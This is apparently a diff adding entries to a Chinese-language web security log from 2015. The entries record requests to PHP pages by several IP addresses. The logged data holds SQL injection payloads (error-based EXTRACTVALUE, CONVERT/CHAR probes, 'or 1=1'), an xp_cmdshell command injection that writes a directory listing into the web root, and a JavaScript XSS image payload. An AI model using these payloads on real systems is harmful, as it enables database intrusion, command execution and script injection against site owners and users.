@@ -1,0 +1,31 @@
+<br><br>操作IP: 115.243.55.143<br>操作时间: 2015-02-25 15:27:44<br>操作页面:/home/index.php<br>提交方式: GET<br>提交参数: p<br>提交数据: 75'
+<br><br>操作IP: 113.162.215.11<br>操作时间: 2015-02-25 19:53:35<br>操作页面:/home/index.php<br>提交方式: GET<br>提交参数: p<br>提交数据: 75'
+<br><br>操作IP: 123.125.160.216<br>操作时间: 2015-02-28 22:40:28<br>操作页面:/home/index.php<br>提交方式: GET<br>提交参数: cat<br>提交数据: 3') AND EXTRACTVALUE(1,CONCAT(0x5c,0x7468696E6B3A,(SELECT (CASE WHEN (1222=1222) THEN 1 ELSE 0 END)),0x3A646966666572656E74)) %23
+<br><br>操作IP: 123.125.160.216<br>操作时间: 2015-02-28 22:40:28<br>操作页面:/home/index.php<br>提交方式: GET<br>提交参数: cat<br>提交数据: 3) AND EXTRACTVALUE(1,CONCAT(0x5c,0x7468696E6B3A,(SELECT (CASE WHEN (1222=1222) THEN 1 ELSE 0 END)),0x3A646966666572656E74)) %23
+<br><br>操作IP: 123.125.160.216<br>操作时间: 2015-02-28 22:40:28<br>操作页面:/home/index.php<br>提交方式: GET<br>提交参数: cat<br>提交数据: 3%' AND 1122=CONVERT(INT,(SELECT CHAR(84)+CHAR(97)+CHAR(105)+CHAR(87)+CHAR(97)+CHAR(110)+CHAR(58)+CHAR(103)+CHAR(111)+CHAR(58)+CHAR(104)+CHAR(111)+CHAR(109)+CHAR(101))) AND '%'='
+<br><br>操作IP: 123.125.160.216<br>操作时间: 2015-02-28 22:40:29<br>操作页面:/home/index.php<br>提交方式: GET<br>提交参数: cat<br>提交数据: 3' AND 1122=CONVERT(INT,(SELECT CHAR(84)+CHAR(97)+CHAR(105)+CHAR(87)+CHAR(97)+CHAR(110)+CHAR(58)+CHAR(103)+CHAR(111)+CHAR(58)+CHAR(104)+CHAR(111)+CHAR(109)+CHAR(101))) AND 'Ta'='Ta
+<br><br>操作IP: 123.125.160.216<br>操作时间: 2015-02-28 22:40:29<br>操作页面:/home/index.php<br>提交方式: GET<br>提交参数: cat<br>提交数据: 3') AND 1122=CONVERT(INT,(SELECT CHAR(84)+CHAR(97)+CHAR(105)+CHAR(87)+CHAR(97)+CHAR(110)+CHAR(58)+CHAR(103)+CHAR(111)+CHAR(58)+CHAR(104)+CHAR(111)+CHAR(109)+CHAR(101))) AND ('Ta'='Ta
+<br><br>操作IP: 123.125.160.216<br>操作时间: 2015-02-28 22:40:29<br>操作页面:/home/index.php<br>提交方式: GET<br>提交参数: cat<br>提交数据: 3) AND 1122=CONVERT(INT,(SELECT CHAR(84)+CHAR(97)+CHAR(105)+CHAR(87)+CHAR(97)+CHAR(110)+CHAR(58)+CHAR(103)+CHAR(111)+CHAR(58)+CHAR(104)+CHAR(111)+CHAR(109)+CHAR(101))) AND (2014=2014
+<br><br>操作IP: 123.125.160.216<br>操作时间: 2015-02-28 22:40:29<br>操作页面:/home/index.php<br>提交方式: GET<br>提交参数: cat<br>提交数据: 3 AND 1122=CONVERT(INT,(SELECT CHAR(84)+CHAR(97)+CHAR(105)+CHAR(87)+CHAR(97)+CHAR(110)+CHAR(58)+CHAR(103)+CHAR(111)+CHAR(58)+CHAR(104)+CHAR(111)+CHAR(109)+CHAR(101))) 
+<br><br>操作IP: 123.125.160.216<br>操作时间: 2015-02-28 22:40:29<br>操作页面:/home/index.php<br>提交方式: GET<br>提交参数: cat<br>提交数据: 3 AND 1=CHAR(106)+CHAR(106)+CHAR(106)
+<br><br>操作IP: 123.125.160.216<br>操作时间: 2015-02-28 22:40:29<br>操作页面:/home/index.php<br>提交方式: GET<br>提交参数: cat<br>提交数据: 3' AND 1=CHAR(106)+CHAR(106)+CHAR(106) --
+<br><br>操作IP: 123.125.160.216<br>操作时间: 2015-02-28 22:40:29<br>操作页面:/home/index.php<br>提交方式: GET<br>提交参数: cat<br>提交数据: 3%' AND 1=CHAR(106)+CHAR(106)+CHAR(106) --
+<br><br>操作IP: 123.125.160.216<br>操作时间: 2015-02-28 22:40:29<br>操作页面:/home/index.php<br>提交方式: GET<br>提交参数: cat<br>提交数据: 3') AND 1=CHAR(106)+CHAR(106)+CHAR(106) --
+<br><br>操作IP: 162.213.210.99<br>操作时间: 2015-03-01 01:42:55<br>操作页面:/home/index.php<br>提交方式: GET<br>提交参数: p<br>提交数据: '43
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 10:54:57<br>操作页面:/home/process/changeUserInfo.process.php<br>提交方式: POST<br>提交参数: email<br>提交数据: ’;exec%20master..xp_cmdshell%20’dir%20 c:%20>%20c:\inetpub\wwwroot\?.txt’--&&  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 10:55:05<br>操作页面:/home/process/changeUserInfo.process.php<br>提交方式: POST<br>提交参数: email<br>提交数据: ’;exec%20master..xp_cmdshell%20’dir%20 c:%20>%20c:\inetpub\wwwroot\?.txt’--&&  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 10:55:15<br>操作页面:/home/process/changeUserInfo.process.php<br>提交方式: POST<br>提交参数: email<br>提交数据: ’;exec%20master..xp_cmdshell%20’dir%20 c:%20>%20c:\inetpub\wwwroot\?.txt’--&&  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 10:55:36<br>操作页面:/home/process/changeUserInfo.process.php<br>提交方式: POST<br>提交参数: email<br>提交数据: ’;exec%20master..xp_cmdshell%20’dir%20 c:%20>%20c:\inetpub\wwwroot\?.txt’--&&  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 10:55:44<br>操作页面:/home/process/changeUserInfo.process.php<br>提交方式: POST<br>提交参数: email<br>提交数据: ’;exec%20master..xp_cmdshell%20’dir%20 c:%20>%20c:\inetpub\wwwroot\?.txt’--&&  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 10:57:25<br>操作页面:/home/process/changeUserInfo.process.php<br>提交方式: POST<br>提交参数: email<br>提交数据: ’;exec%20master..xp_cmdshell%20’dir%20 c:%20>%20c:\inetpub\wwwroot\?.txt’--&&  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 11:00:56<br>操作页面:/home/process/changeUserInfo.process.php<br>提交方式: POST<br>提交参数: email<br>提交数据: ’;exec%20master..xp_cmdshell%20’dir%20 c:%20>%20c:\inetpub\wwwroot\?.txt’--&&  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 11:02:05<br>操作页面:/home/process/changeUserInfo.process.php<br>提交方式: POST<br>提交参数: email<br>提交数据: ’ or 1=1--  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 11:02:13<br>操作页面:/home/process/changeUserInfo.process.php<br>提交方式: POST<br>提交参数: email<br>提交数据: ’ or 1=1--  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 11:02:58<br>操作页面:/home/process/changeUserInfo.process.php<br>提交方式: POST<br>提交参数: email<br>提交数据: ’ or 1=1--  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 11:03:07<br>操作页面:/home/process/changeUserInfo.process.php<br>提交方式: POST<br>提交参数: email<br>提交数据: ’ or 1=1--  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 11:03:31<br>操作页面:/home/process/changeUserInfo.process.php<br>提交方式: POST<br>提交参数: email<br>提交数据: ’ or 1=1--  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 11:03:42<br>操作页面:/home/process/changeUserInfo.process.php<br>提交方式: POST<br>提交参数: email<br>提交数据: ’ or 1=1--  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 17:12:35<br>操作页面:/home/process/addActivity.process.php<br>提交方式: POST<br>提交参数: addArticle_title<br>提交数据: <img src="javas&#99;ript:alert(’XSS’)">  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 09:12:46<br>操作页面:/home/consult/user/questionrecord.php<br>提交方式: POST<br>提交参数: content<br>提交数据: <img src="javas&#99;ript:alert(’XSS’)">  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 09:12:49<br>操作页面:/home/consult/user/questionrecord.php<br>提交方式: POST<br>提交参数: content<br>提交数据: <img src="javas&#99;ript:alert(’XSS’)">  
+<br><br>操作IP: 59.78.48.4<br>操作时间: 2015-03-06 09:12:58<br>操作页面:/home/consult/user/questionrecord.php<br>提交方式: POST<br>提交参数: content<br>提交数据: <img src="javas&#99;ript:alert(’XSS’)">  
